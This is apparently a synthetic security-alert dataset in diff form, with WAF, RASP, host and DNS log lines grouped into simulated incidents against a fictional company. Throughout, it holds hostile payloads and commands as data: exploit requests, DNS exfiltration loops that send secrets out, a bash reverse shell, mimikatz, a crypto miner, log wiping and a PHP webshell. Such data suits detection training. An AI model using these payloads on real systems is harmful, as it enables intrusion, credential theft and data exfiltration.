+SIM-1024-1,SIM-B-1024,,,2026-06-19 03:08:27,waf,WAF0325504,/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte
+SIM-1024-2,SIM-B-1024,,,2026-06-19 03:08:29,web,WEB0327622,/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte
+SIM-1024-3,SIM-B-1024,,,2026-06-19 03:08:30,rasp,RASP0360135,"https://app-iis-33.ops-corp.com/ueditor/net/controller.ashx {""upload"": ""catchimage""} Mozilla/5.0 (Macintosh; I"
+SIM-1024-4,SIM-B-1024,,,2026-06-19 03:09:32,hids,HID0352753,"wmic /node:10.20.3.71 process call create ""cmd.exe /c whoami"" cmd.exe cmd.exe /c wmic /node:10.20.3.71 proc pr"
+SIM-1024-5,SIM-B-1024,,,2026-06-20 23:21:32,dns,DNS0350304,aa671fef.flyqkd-7a35.io A 192.0.2.35
+SIM-1024-6,SIM-B-1024,,,2026-06-20 23:22:17,dns,DNS0350308,f5f06add.flyqkd-7a35.io A 10.10.25.160
+SIM-1024-7,SIM-B-1024,,,2026-06-20 23:23:52,dns,DNS0350316,22f4ad3d.flyqkd-7a35.io A 10.10.29.38
+SIM-1025-1,SIM-B-1025,,,2026-06-10 23:23:52,waf,WAF0269065,/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK
+SIM-1025-2,SIM-B-1025,,,2026-06-10 23:23:53,web,WEB0270816,/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK
+SIM-1025-3,SIM-B-1025,,,2026-06-10 23:23:55,rasp,RASP0297685,"https://app-spring-118.ops-corp.com/actuator/heapdump {""heapdump"": ""creds_in_mem""} Mozilla/5.0 (X11; Linux x86"
+SIM-1025-4,SIM-B-1025,,,2026-06-10 23:24:53,hids,HID0291591,for l in $(strings /tmp/h.hprof|base64|fold -w30); do nslookup $l.qzrthm-4a17.net; done strings strings for fo
+SIM-1025-5,SIM-B-1025,,,2026-06-11 00:54:53,dns,DNS0276545,d3cfbf5f.qzrthm-4a17.net A 10.10.24.224
+SIM-1025-6,SIM-B-1025,,,2026-06-11 00:56:00,dns,DNS0276551,9fe3bf96.qzrthm-4a17.net A 192.0.2.141
+SIM-1025-7,SIM-B-1025,,,2026-06-11 00:57:45,dns,DNS0276560,8f883773.qzrthm-4a17.net A 10.10.30.66
+SIM-1026-1,SIM-B-1026,,,2026-06-02 13:14:35,waf,WAF0210777,"/wls-wsat/CoordinatorPortType <WorkContext xmlns=""http://bea.com/2004/06/soap/workarea/""> Mozilla/5.0 (Linux; "
+SIM-1026-2,SIM-B-1026,,,2026-06-02 13:14:37,web,WEB0212149,"/wls-wsat/CoordinatorPortType <WorkContext xmlns=""http://bea.com/2004/06/soap/workarea/""> Mozilla/5.0 (Linux; "
+SIM-1026-3,SIM-B-1026,,,2026-06-02 13:14:38,rasp,RASP0233189,"https://app-java-204.ops-corp.com/wls-wsat/CoordinatorPortType {""xml"": ""ProcessBuilder""} Mozilla/5.0 (Linux; A"
+SIM-1026-4,SIM-B-1026,,,2026-06-02 13:15:39,hids,HID0228426,cat /etc/shadow /bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== java weblogic.Server
+SIM-1026-5,SIM-B-1026,,,2026-06-02 20:03:39,dns,DNS0215652,7881b511.bpsxjv-c930.com A 10.10.47.140
+SIM-1026-6,SIM-B-1026,,,2026-06-02 20:04:36,dns,DNS0215657,f7e9d64d.bpsxjv-c930.com A 203.0.113.148
+SIM-1026-7,SIM-B-1026,,,2026-06-02 20:06:09,dns,DNS0215665,e946294b.bpsxjv-c930.com A 10.10.37.60
+SIM-1027-1,SIM-B-1027,,,2026-06-16 03:47:09,waf,WAF0304930,"/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[""/bin/sh"",""id""] Mozilla/5.0 (iPhone; C"
+SIM-1027-2,SIM-B-1027,,,2026-06-16 03:47:10,web,WEB0306914,"/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[""/bin/sh"",""id""] Mozilla/5.0 (iPhone; C"
+SIM-1027-3,SIM-B-1027,,,2026-06-16 03:47:12,rasp,RASP0337370,"https://app-spring-9.ops-corp.com/nacos/v1/cs/configs {""jwt"": ""nacos_default_secret""} Mozilla/5.0 (iPhone; CPU"
+SIM-1027-4,SIM-B-1027,,,2026-06-16 03:48:14,hids,HID0330457,for l in $(cat /home/nacos/conf/cluster.conf|base64|fold -w30); do nslookup $l.mnwcug-15ef.org; done for for l
+SIM-1027-5,SIM-B-1027,,,2026-06-16 04:42:14,dns,DNS0314838,c0e41548.mnwcug-15ef.org A 10.10.33.97
+SIM-1027-6,SIM-B-1027,,,2026-06-16 04:42:48,dns,DNS0314840,fe3f939c.mnwcug-15ef.org A 198.51.100.48
+SIM-1027-7,SIM-B-1027,,,2026-06-16 04:44:13,dns,DNS0314848,885dd9ec.mnwcug-15ef.org A 10.10.39.75
+SIM-1028-1,SIM-B-1028,,,2026-06-08 11:25:14,waf,WAF0251771,"/api/ds/query POST {""queries"":[{""expr"":""SELECT 1; COPY (SELECT '') TO PROGRAM 'id'""}]} Mozilla/5.0 (Linux; And"
+SIM-1028-2,SIM-B-1028,,,2026-06-08 11:25:16,web,WEB0253410,"/api/ds/query POST {""queries"":[{""expr"":""SELECT 1; COPY (SELECT '') TO PROGRAM 'id'""}]} Mozilla/5.0 (Linux; And"
+SIM-1028-3,SIM-B-1028,,,2026-06-08 11:25:17,rasp,RASP0278549,"https://app-go-14.ops-corp.com/api/ds/query {""sql_expr"": ""COPY TO PROGRAM"", ""cmd"": ""id""} Mozilla/5.0 (Linux; A"
+SIM-1028-4,SIM-B-1028,,,2026-06-08 11:26:14,hids,HID0272850,ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== /usr/sbin/grafana-server
+SIM-1028-5,SIM-B-1028,,,2026-06-13 13:56:14,dns,DNS0295422,205e79ac.khdtqe-6b28.io A 10.10.42.98
+SIM-1028-6,SIM-B-1028,,,2026-06-13 13:56:50,dns,DNS0295425,6caf7104.khdtqe-6b28.io A 192.0.2.128
+SIM-1028-7,SIM-B-1028,,,2026-06-13 13:58:21,dns,DNS0295433,796562f0.khdtqe-6b28.io A 10.10.48.72
+SIM-1029-1,SIM-B-1029,,,2026-06-04 21:56:24,waf,WAF0227125,/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10
+SIM-1029-2,SIM-B-1029,,,2026-06-04 21:56:25,web,WEB0228603,/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10
+SIM-1029-3,SIM-B-1029,,,2026-06-04 21:56:27,rasp,RASP0251278,"https://app-java-43.ops-corp.com/api/userService {""hessian"": ""rO0ABXNyABFqYXZh""} Mozilla/5.0 (Windows NT 10.0;"
+SIM-1029-4,SIM-B-1029,,,2026-06-04 21:57:29,hids,HID0246141,for l in $(cat /opt/dubbo/conf/dubbo.properties|base64|fold -w30); do nslookup $l.prsloy-0d4c.net; done for fo
+SIM-1029-5,SIM-B-1029,,,2026-06-05 01:15:29,dns,DNS0232108,56a78f02.prsloy-0d4c.net A 10.10.38.144
+SIM-1029-6,SIM-B-1029,,,2026-06-05 01:16:24,dns,DNS0232112,f33b31fd.prsloy-0d4c.net A 10.10.39.235
+SIM-1029-7,SIM-B-1029,,,2026-06-05 01:17:40,dns,DNS0232119,118fa038.prsloy-0d4c.net A 198.51.100.50
+SIM-1030-1,SIM-B-1030,,,2026-06-08 19:59:52,waf,WAF0254245,/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl
+SIM-1030-2,SIM-B-1030,,,2026-06-08 19:59:54,web,WEB0255899,/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl
+SIM-1030-3,SIM-B-1030,,,2026-06-08 19:59:55,rasp,RASP0281286,"https://app-java-171.ops-corp.com/scriptText {""script_console"": ""groovy"", ""cmd"": ""id""} Mozilla/5.0 (Windows NT"
+SIM-1030-4,SIM-B-1030,,,2026-06-08 20:01:22,hids,HID0275533,cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== java -jar jenkins.war
+SIM-1030-5,SIM-B-1030,,,2026-06-09 23:25:22,dns,DNS0268660,9d727469.xtfwnj-ae63.com A 198.51.100.32
+SIM-1030-6,SIM-B-1030,,,2026-06-09 23:26:14,dns,DNS0268664,9c1d2627.xtfwnj-ae63.com A 10.10.35.54
+SIM-1030-7,SIM-B-1030,,,2026-06-09 23:27:56,dns,DNS0268673,f634301b.xtfwnj-ae63.com A 10.10.33.23
+SIM-1031-1,SIM-B-1031,,,2026-06-27 13:31:11,waf,WAF0383857,"/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(""id"") Mozilla/5.0 (Windows NT 10.0; "
+SIM-1031-2,SIM-B-1031,,,2026-06-27 13:31:12,web,WEB0386354,"/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(""id"") Mozilla/5.0 (Windows NT 10.0; "
+SIM-1031-3,SIM-B-1031,,,2026-06-27 13:31:14,rasp,RASP0424702,"https://app-python-55.ops-corp.com/dags/upload {""dag_bag"": ""pickle"", ""cmd"": ""os.system""} Mozilla/5.0 (Windows "
+SIM-1031-4,SIM-B-1031,,,2026-06-27 13:33:09,hids,HID0415992,for l in $(grep -i pass /opt/airflow/airflow.cfg|base64|fold -w30); do nslookup $l.glmbcr-39d7.org; done for f
+SIM-1031-5,SIM-B-1031,,,2026-06-29 23:39:09,dns,DNS0417211,947e7e61.glmbcr-39d7.org A 203.0.113.63
+SIM-1031-6,SIM-B-1031,,,2026-06-29 23:39:57,dns,DNS0417215,2f900c57.glmbcr-39d7.org A 10.10.42.115
+SIM-1031-7,SIM-B-1031,,,2026-06-29 23:41:06,dns,DNS0417221,33caf0ce.glmbcr-39d7.org A 10.10.25.107
+SIM-1032-1,SIM-B-1032,,,2026-06-16 23:24:38,waf,WAF0310589,"/api/setup/validate {""db"":""h2"",""init"":""RUNSCRIPT FROM 'http://10.20.5.19/x.sql'""} Mozilla/5.0 (Macintosh; Inte"
+SIM-1032-2,SIM-B-1032,,,2026-06-16 23:24:40,web,WEB0312610,"/api/setup/validate {""db"":""h2"",""init"":""RUNSCRIPT FROM 'http://10.20.5.19/x.sql'""} Mozilla/5.0 (Macintosh; Inte"
+SIM-1032-3,SIM-B-1032,,,2026-06-16 23:24:41,rasp,RASP0343631,"https://app-java-190.ops-corp.com/api/setup/validate {""h2_init"": ""RUNSCRIPT""} Mozilla/5.0 (Macintosh; Intel Ma"
+SIM-1032-4,SIM-B-1032,,,2026-06-16 23:26:41,hids,HID0336594,id -a /usr/bin/id id -a <== /bin/sh -c 'id -a' <== /usr/bin/java -jar metabase.jar
+SIM-1032-5,SIM-B-1032,,,2026-06-16 23:56:41,dns,DNS0320789,9c49ebe3.djqkps-f2a0.io A 10.10.33.65
+SIM-1032-6,SIM-B-1032,,,2026-06-16 23:57:29,dns,DNS0320794,0e038dd9.djqkps-f2a0.io A 10.10.24.43
+SIM-1032-7,SIM-B-1032,,,2026-06-16 23:59:09,dns,DNS0320802,b908e184.djqkps-f2a0.io A 192.0.2.91
+SIM-1033-1,SIM-B-1033,,,2026-06-30 06:21:24,waf,WAF0402551,/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64
+SIM-1033-2,SIM-B-1033,,,2026-06-30 06:21:25,web,WEB0405170,/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64
+SIM-1033-3,SIM-B-1033,,,2026-06-30 06:21:27,rasp,RASP0445388,"https://app-php-27.ops-corp.com/user/register {""post_render"": ""exec"", ""php"": ""markup""} Mozilla/5.0 (X11; Linux"
+SIM-1033-4,SIM-B-1033,,,2026-06-30 06:22:53,hids,HID0436248,for l in $(base64 /var/www/html/sites/default/settings.php|fold -w30); do nslookup $l.ynvtkh-8c15.net; done fo
+SIM-1033-5,SIM-B-1033,,,2026-06-30 15:58:53,dns,DNS0422262,442ffe88.ynvtkh-8c15.net A 192.0.2.55
+SIM-1033-6,SIM-B-1033,,,2026-06-30 15:59:18,dns,DNS0422264,9beee1b0.ynvtkh-8c15.net A 10.10.29.198
+SIM-1033-7,SIM-B-1033,,,2026-06-30 16:00:14,dns,DNS0422269,98ea0696.ynvtkh-8c15.net A 10.10.28.42
+SIM-1034-1,SIM-B-1034,,,2026-06-13 07:00:14,waf,WAF0285098,/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A
+SIM-1034-2,SIM-B-1034,,,2026-06-13 07:00:16,web,WEB0286953,/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A
+SIM-1034-3,SIM-B-1034,,,2026-06-13 07:00:17,rasp,RASP0315425,"https://app-java-66.ops-corp.com/setup/setupadministrator.action {""setup_bypass"": true} Mozilla/5.0 (Linux; An"
+SIM-1034-4,SIM-B-1034,,,2026-06-13 07:02:16,hids,HID0308971,whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== java -jar confluence.jar
+SIM-1034-5,SIM-B-1034,,,2026-06-22 01:20:16,dns,DNS0358340,1efb0869.czwlbd-5e72.com A 10.10.37.77
+SIM-1034-6,SIM-B-1034,,,2026-06-22 01:20:52,dns,DNS0358343,d51fe8ad.czwlbd-5e72.com A 203.0.113.44
+SIM-1034-7,SIM-B-1034,,,2026-06-22 01:22:16,dns,DNS0358351,cefdb1bf.czwlbd-5e72.com A 10.10.24.182
+SIM-1035-1,SIM-B-1035,,,2026-06-30 07:25:37,waf,WAF0402860,/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;
+SIM-1035-2,SIM-B-1035,,,2026-06-30 07:25:38,web,WEB0405481,/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;
+SIM-1035-3,SIM-B-1035,,,2026-06-30 07:25:40,rasp,RASP0445729,"https://app-iis-7.ops-corp.com/autodiscover/autodiscover.json?@a.com/ {""ssrf"": ""adc""} Mozilla/5.0 (iPhone; CPU"
+SIM-1035-4,SIM-B-1035,,,2026-06-30 07:27:35,hids,HID0436585,"wmic /node:10.20.3.44 process call create ""cmd.exe /c powershell -enc SQBFAFgA"" cmd.exe cmd.exe /c wmic <== se"
+SIM-1035-5,SIM-B-1035,,,2026-06-30 12:09:35,dns,DNS0421080,5d0d7221.srpmfx-b146.org A 10.10.39.46
+SIM-1035-6,SIM-B-1035,,,2026-06-30 12:10:39,dns,DNS0421085,7f1cf47f.srpmfx-b146.org A 10.10.29.52
+SIM-1035-7,SIM-B-1035,,,2026-06-30 12:12:18,dns,DNS0421094,bfe3dd82.srpmfx-b146.org A 192.0.2.141
+SIM-1036-1,SIM-B-1036,,,2026-06-17 04:55:35,waf,WAF0312179,"/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata ""\c${system('id')};"") Mozilla/5.0 (Linux; Android 13;"
+SIM-1036-2,SIM-B-1036,,,2026-06-17 04:55:37,web,WEB0314210,"/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata ""\c${system('id')};"") Mozilla/5.0 (Linux; Android 13;"
+SIM-1036-3,SIM-B-1036,,,2026-06-17 04:55:38,rasp,RASP0345390,"https://app-rails-34.ops-corp.com/api/v4/projects/4/uploads {""exiftool"": ""DjVu""} Mozilla/5.0 (Linux; Android 1"
+SIM-1036-4,SIM-B-1036,,,2026-06-17 04:56:38,hids,HID0338312,for l in $(cat /etc/gitlab/gitlab-secrets.json|base64|fold -w30); do nslookup $l.hgwqnk-93da.io; done for for 
+SIM-1036-5,SIM-B-1036,,,2026-06-18 17:50:38,dns,DNS0333750,451b09e5.hgwqnk-93da.io A 10.10.34.233
+SIM-1036-6,SIM-B-1036,,,2026-06-18 17:51:23,dns,DNS0333754,8ba73280.hgwqnk-93da.io A 192.0.2.43
+SIM-1036-7,SIM-B-1036,,,2026-06-18 17:52:58,dns,DNS0333762,94b12761.hgwqnk-93da.io A 10.10.40.28
+SIM-1037-1,SIM-B-1037,,,2026-06-25 18:21:11,waf,WAF0371410,/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10
+SIM-1037-2,SIM-B-1037,,,2026-06-25 18:21:12,web,WEB0373827,/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10
+SIM-1037-3,SIM-B-1037,,,2026-06-25 18:21:14,rasp,RASP0410930,"https://app-php-84.ops-corp.com/zabbix.php {""sqli"": ""auditlog.list"", ""param"": ""userid""} Mozilla/5.0 (Windows N"
+SIM-1037-4,SIM-B-1037,,,2026-06-25 18:23:12,hids,HID0402505,"for l in $(mysql -e ""select passwd from users"" zabbix|base64|fold -w30); do nslookup $l.lvctzj-7f4e.net; done "
+SIM-1037-5,SIM-B-1037,,,2026-06-25 19:35:12,dns,DNS0386257,d8726c49.lvctzj-7f4e.net A 10.10.37.184
+SIM-1037-6,SIM-B-1037,,,2026-06-25 19:36:04,dns,DNS0386262,f4927a6d.lvctzj-7f4e.net A 198.51.100.70
+SIM-1037-7,SIM-B-1037,,,2026-06-25 19:37:15,dns,DNS0386268,5c38abd8.lvctzj-7f4e.net A 10.10.38.122
+SIM-1038-1,SIM-B-1038,,,2026-06-05 01:07:50,waf,WAF0228044,"/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree ""\\5f71a2c4.tbnxmu-2c8b.com\a"" Mozilla/5.0 (Windows NT 11.0;"
+SIM-1038-2,SIM-B-1038,,,2026-06-05 01:07:52,web,WEB0229529,"/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree ""\\5f71a2c4.tbnxmu-2c8b.com\a"" Mozilla/5.0 (Windows NT 11.0;"
+SIM-1038-3,SIM-B-1038,,,2026-06-05 01:07:53,rasp,RASP0252295,"https://app-php-121.ops-corp.com/api/v1/report?id=1 {""xp_dirtree"": true, ""oob"": ""dns""} Mozilla/5.0 (Windows NT"
+SIM-1038-4,SIM-B-1038,,,2026-06-05 01:09:50,hids,HID0247143,"ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.6.88 ""mysqldump -uroot app|gzip -c"" ssh <== /usr/sbin/"
+SIM-1038-5,SIM-B-1038,,,2026-06-25 01:09:50,dns,DNS0380559,353ab2b4.tbnxmu-2c8b.com A 10.10.41.111
+SIM-1038-6,SIM-B-1038,,,2026-06-25 01:10:12,dns,DNS0380560,415e2098.tbnxmu-2c8b.com A 10.10.35.191
+SIM-1038-7,SIM-B-1038,,,2026-06-25 01:10:51,dns,DNS0380564,bc793874.tbnxmu-2c8b.com A 203.0.113.49
+SIM-1039-1,SIM-B-1039,,,2026-06-01 08:28:06,waf,WAF0202480,"/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT"
+SIM-1039-2,SIM-B-1039,,,2026-06-01 08:28:07,web,WEB0203798,"/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT"
+SIM-1039-3,SIM-B-1039,,,2026-06-01 08:28:09,rasp,RASP0224009,"https://app-java-202.ops-corp.com/api/v1/soap/endpoint {""xxe"": ""ext_entity""} Mozilla/5.0 (Windows NT 10.0; Win"
+SIM-1039-4,SIM-B-1039,,,2026-06-01 08:29:35,hids,HID0219437,cat /etc/hostname /bin/cat cat /etc/hostname <== /bin/sh -c 'cat /etc/hostname' <== java -jar /opt/app/api.jar
+SIM-1039-5,SIM-B-1039,,,2026-06-01 22:17:35,dns,DNS0208918,e10b4d76.kqwyvs-6a03.org A 203.0.113.123
+SIM-1039-6,SIM-B-1039,,,2026-06-01 22:18:20,dns,DNS0208922,078390f8.kqwyvs-6a03.org A 10.10.47.6
+SIM-1039-7,SIM-B-1039,,,2026-06-01 22:19:46,dns,DNS0208930,4ec37f43.kqwyvs-6a03.org A 10.10.39.86
+SIM-1040-1,SIM-B-1040,,,2026-06-14 10:30:41,waf,WAF0293029,/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
+SIM-1040-2,SIM-B-1040,,,2026-06-14 10:30:43,web,WEB0294936,/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
+SIM-1040-3,SIM-B-1040,,,2026-06-14 10:30:44,rasp,RASP0324201,"https://app-java-143.ops-corp.com/api/v1/import {""xstream"": ""dynamic-proxy""} Mozilla/5.0 (Macintosh; Intel Mac"
+SIM-1040-4,SIM-B-1040,,,2026-06-14 10:31:41,hids,HID0317560,for l in $(cat /opt/app/config/application.yml|base64|fold -w30); do nslookup $l.pfdrmt-e598.io; done for for 
+SIM-1040-5,SIM-B-1040,,,2026-06-17 11:07:41,dns,DNS0324249,4b6843de.pfdrmt-e598.io A 10.10.41.133
+SIM-1040-6,SIM-B-1040,,,2026-06-17 11:08:06,dns,DNS0324251,f69b72c1.pfdrmt-e598.io A 10.10.35.105
+SIM-1040-7,SIM-B-1040,,,2026-06-17 11:09:08,dns,DNS0324256,1a1af427.pfdrmt-e598.io A 192.0.2.29
+SIM-1041-1,SIM-B-1041,,,2026-06-02 02:14:00,hids,HID0224980,"mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" mimikatz.exe cmd.exe /c C:\Windows\Temp\m.exe <== /"
+SIM-1042-1,SIM-B-1042,SIM-INC-1042,CASE-003,2026-06-14 07:08:35,waf,WAF0292058,/api/v1/scheduler/run cmd=schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe Mozilla/5.0 (Win
+SIM-1042-2,SIM-B-1042,SIM-INC-1042,CASE-003,2026-06-14 07:08:36,rasp,RASP0323127,"https://app-tomcat-47.ops-corp.com/api/v1/scheduler/run {""cmd_inject"": ""schtasks /create /sc minute"", ""sched_t"
+SIM-1042-3,SIM-B-1042,SIM-INC-1042,CASE-003,2026-06-14 07:10:02,hids,HID0316510,schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe schtasks.exe java.exe -jar C:\svc\gw.jar <
+SIM-1043-1,SIM-B-1043,,,2026-06-23 22:37:25,hids,HID0388830,sc create SmSvc binPath= C:\Windows\Temp\svc.exe start= auto sc.exe cmd.exe /c sc create SmSvc binPath= C:\Win
+SIM-1044-1,SIM-B-1044,,,2026-06-19 05:44:24,hids,HID0353559,bash -i >& /dev/tcp/10.20.5.19/8443 0>&1 /bin/bash bash -i <== /bin/sh -c 'bash -i' <== nginx: worker process
+SIM-1045-1,SIM-B-1045,,,2026-06-08 18:18:52,hids,HID0274999,xmrig -o stratum+tcp://10.20.5.77:3333 -u 4ANf8kQ -p x xmrig xmrig <== /bin/sh -c '/tmp/.kr/xmrig -o st'
+SIM-1046-1,SIM-B-1046,,,2026-06-22 04:42:44,waf,WAF0346717,/backup/export src=../../etc/shadow&dst=/tmp/.cache.tgz Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KH
+SIM-1046-2,SIM-B-1046,,,2026-06-22 04:44:12,hids,HID0375743,tar czf /tmp/.cache /etc/shadow /etc/passwd tar czf /tmp/.cache <== /bin/sh -c 'tar' <== nginx: worker process
+SIM-1047-1,SIM-B-1047,,,2026-06-23 10:52:06,hids,HID0385157,wevtutil cl Security && vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c wevtutil cl Security && vss <==
+SIM-1048-1,SIM-B-1048,,,2026-06-07 22:44:39,rasp,RASP0274505,"https://app-tomcat-38.ops-corp.com/uploads/shell.jsp {""webshell"": ""shell.jsp"", ""cmd"": ""id""} Mozilla/5.0 (Windo"
+SIM-1048-2,SIM-B-1048,,,2026-06-07 22:45:36,hids,HID0268889,id /usr/bin/id id <== /bin/sh -c 'id' <== /usr/local/tomcat/bin/catalina.sh
+SIM-1049-1,SIM-B-1049,,,2026-06-13 06:14:34,rasp,RASP0315182,"https://app-php-92.ops-corp.com/uploads/up.php {""upload"": ""shell.php"", ""act"": ""upload""} Mozilla/5.0 (Macintosh"
+SIM-1049-2,SIM-B-1049,,,2026-06-13 06:15:31,hids,HID0308727,mv /tmp/php3f2a.tmp /var/www/html/shell.php /bin/mv mv <== /bin/sh -c 'mv /tmp/php3f' <== php-fpm: pool www
+SIM-1050-1,SIM-B-1050,,,2026-06-17 11:43:24,rasp,RASP0347559,"https://app-iis-20.ops-corp.com/upload/cmd.aspx {""webshell"": ""cmd.aspx"", ""cmd"": ""whoami""} Mozilla/5.0 (Windows"
+SIM-1050-2,SIM-B-1050,,,2026-06-17 11:45:19,hids,HID0340441,"whoami /all C:\Windows\System32\whoami.exe whoami /all <== cmd.exe /c whoami /all <== w3wp.exe -ap ""DefaultApp"
+SIM-1051-1,SIM-B-1051,,,2026-06-27 05:17:05,rasp,RASP0422075,"https://app-spring-18.ops-corp.com/api/v1/upload/gateway {""cmd"": ""id;whoami"", ""payload_enc"": ""base64-aes""} Moz"
+SIM-1051-2,SIM-B-1051,,,2026-06-27 05:18:00,hids,HID0413414,id;whoami /bin/bash id;whoami <== /bin/sh -c 'id;whoami' <== java -jar /opt/app/gw.jar
+SIM-1052-1,SIM-B-1052,,,2026-06-25 14:39:38,rasp,RASP0409752,"https://app-go-27.ops-corp.com/api/v1/convert {""cmd_inject"": ""|id"", ""lang"": ""go""} Mozilla/5.0 (X11; Linux x86_"
+SIM-1052-2,SIM-B-1052,,,2026-06-25 14:41:06,hids,HID0401348,cat /etc/hosts /bin/cat cat /etc/hosts <== /bin/sh -c 'cat /etc/hosts' <== /opt/app/apiserver
+SIM-1053-1,SIM-B-1053,,,2026-06-05 03:32:52,waf,WAF0228741,/api/v2/proxy/exec ip=10.20.3.14;id;cat /etc/hostname Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537
+SIM-1053-2,SIM-B-1053,,,2026-06-05 03:32:53,rasp,RASP0253066,"https://app-go-64.ops-corp.com/api/v2/proxy/exec {""cmd_inject"": "";id;cat /etc/hostname"", ""gw"": true} Mozilla/5"
+SIM-1053-3,SIM-B-1053,,,2026-06-05 03:34:52,hids,HID0247898,curl -sS http://10.20.6.88:8080/api/v1/users /usr/bin/curl curl -sS <== /bin/sh -c 'curl' <== api-gw
+SIM-1054-1,SIM-B-1054,,,2026-06-06 13:11:50,waf,WAF0238444,"/grpc.gateway.Exec/Start 1:{""cmd"":""x;id;uname -a""} 5:true Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS "
+SIM-1054-2,SIM-B-1054,,,2026-06-06 13:11:52,rasp,RASP0263802,"https://app-go-71.ops-corp.com/grpc.gateway.Exec/Start {""cmd_inject"": ""x;id;uname -a"", ""grpc_web"": true} Mozil"
+SIM-1054-3,SIM-B-1054,,,2026-06-06 13:12:51,hids,HID0258407,id;uname -a /usr/bin/id id;uname -a <== /bin/sh -c 'id;uname -a' <== /opt/app/grpc-gw
+SIM-1055-1,SIM-B-1055,,,2026-06-26 07:43:27,waf,WAF0375266,"/api/v1/namespaces/default/pods {""metadata"":{""name"":""p1""},""cmd"":[""sh"",""-c"",""id""]} Mozilla/5.0 (Linux; Android "
+SIM-1055-2,SIM-B-1055,,,2026-06-26 07:43:28,rasp,RASP0415196,"https://app-node-45.ops-corp.com/api/v1/namespaces/default/pods {""container_api"": ""pods"", ""cmd"": ""id""} Mozilla"
+SIM-1055-3,SIM-B-1055,,,2026-06-26 07:44:26,hids,HID0406677,sh -c id /bin/sh sh -c id <== /usr/bin/containerd-shim <== kubelet --config=/var/lib/kubelet
+SIM-1056-1,SIM-B-1056,,,2026-06-22 00:01:55,waf,WAF0345368,"/api/definitions {""parameters"":[{""name"":""cmd"",""value"":""/tmp/.rb/run""}]} Mozilla/5.0 (iPhone; CPU iPhone OS 17_"
+SIM-1056-2,SIM-B-1056,,,2026-06-22 00:01:57,rasp,RASP0382114,"https://app-java-58.ops-corp.com/api/definitions {""unauth"": ""/api/definitions"", ""cmd"": ""/tmp/.rb/run""} Mozilla"
+SIM-1056-3,SIM-B-1056,,,2026-06-22 00:02:56,hids,HID0374278,sh -c /tmp/.rb/run /bin/sh sh -c /tmp/.rb/run <== beam.smp -W w -A 64 -- -root <== rabbitmq-server
+SIM-1057-1,SIM-B-1057,,,2026-06-15 02:44:02,waf,WAF0297707,"/phpmyadmin/import.php sql=SELECT ""<?php passthru($_GET[c]);?>"" INTO OUTFILE ""/var/www/x.php"" Mozilla/5.0 (Win"
+SIM-1057-2,SIM-B-1057,,,2026-06-15 02:44:03,rasp,RASP0329377,"https://app-php-66.ops-corp.com/phpmyadmin/import.php {""sql_write"": ""INTO OUTFILE /var/www/x.php"", ""webshell"":"
+SIM-1057-3,SIM-B-1057,,,2026-06-15 02:45:04,hids,HID0322629,chmod 755 /var/www/x.php /bin/chmod chmod 755 /var/www/x.php <== /bin/sh -c 'chmod 755' <== php-fpm: pool www
